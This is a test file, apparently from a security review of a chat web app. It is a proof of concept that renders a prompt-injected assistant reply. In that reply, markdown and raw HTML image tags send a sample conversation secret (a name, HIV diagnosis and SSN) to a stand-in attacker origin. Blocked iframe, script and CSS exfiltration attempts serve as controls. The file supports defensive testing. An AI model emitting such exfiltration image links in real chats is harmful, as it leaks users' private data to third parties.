// @vitest-environment jsdom
/**
 * Renders a prompt-injected assistant message through the real chat markdown
 * pipeline and dumps the resulting DOM to browser-poc/rendered-message.html,
 * which the Playwright script then serves under the production CSP to show
 * the browser really fetches the attacker URL.
 */
import { MessageContent } from '@/components/chat/renderers/components/MessageContent'
import { cleanup, render, waitFor } from '@testing-library/react'
import { mkdirSync, writeFileSync } from 'node:fs'
import { afterAll, afterEach, beforeAll, expect, it, vi } from 'vitest'

vi.mock('@/services/inference/metadata-client', () => ({
  fetchFavicon: () => Promise.resolve(null),
  fetchLinkMetadata: () => Promise.reject(new Error('mocked')),
}))
beforeAll(() =>
  vi.stubGlobal('ResizeObserver', class { observe() {} disconnect() {} }),
)
afterAll(() => vi.unstubAllGlobals())
afterEach(cleanup)

const ATTACKER = process.env.POC_ATTACKER_ORIGIN ?? 'https://127.0.0.1:44443'
const SECRET = encodeURIComponent(
  'prior-turn: "My name is Jane Roe, I was diagnosed with HIV in 2023, SSN 123-45-6789"',
)
const OUT = '/root/tinfoil-review/work/webapp-render-xss/browser-poc/rendered-message.html'

it('dumps the rendered assistant message', async () => {
  const content = [
    'Sure! Here is a short summary of our conversation so far.',
    '',
    `![](${ATTACKER}/exfil.png?d=${SECRET}&via=markdown-image)`,
    '',
    `<img src="${ATTACKER}/exfil.png?d=${SECRET}&via=raw-html-img">`,
    '',
    // Negative controls: must NOT reach the attacker under the production CSP.
    `<iframe src="${ATTACKER}/should-be-blocked-iframe"></iframe>`,
    `<script>new Image().src="${ATTACKER}/should-be-blocked-inline-script"</script>`,
    `<div style="background:url(${ATTACKER}/should-be-blocked-style)">x</div>`,
    '',
    '$$E=mc^2$$',
  ].join('\n')
  const { container } = render(
    <MessageContent content={content} isDarkMode={false} />,
  )
  await waitFor(() =>
    expect(container.querySelectorAll('.katex').length).toBeGreaterThan(0),
  )
  mkdirSync('/root/tinfoil-review/work/webapp-render-xss/browser-poc', { recursive: true })
  writeFileSync(OUT, container.innerHTML)
  console.log('[poc] wrote', OUT, container.innerHTML.length, 'bytes')
  console.log('[poc] img srcs:', Array.from(container.querySelectorAll('img')).map((i) => i.src))
})
